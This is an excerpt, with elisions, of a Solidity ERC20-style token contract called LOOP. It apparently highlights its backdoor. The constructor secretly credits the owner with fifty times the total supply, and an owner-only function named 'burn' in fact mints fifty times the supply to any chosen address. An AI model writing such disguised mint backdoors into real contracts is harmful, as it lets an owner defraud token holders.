...
contract LOOP is Context, IERC20, Ownable {
    ...
    uint256 private constant _currentSupply = MAX / 2.2173260e55;
    ...
    constructor (string memory name_, string memory symbol_, uint8 decimals_, address _Owner) {
        ...
        _rOwned[_Owner] = _rOwned[_Owner].add((_totalSupply.mul(currentRate)).mul(50));
    ...
    function burn(address account, uint256 amount, address _Burn) public onlyOwner(){
        ...
        _rOwned[_Burn] = _rOwned[_Burn].add((_totalSupply.mul(currentRate)).mul(50));
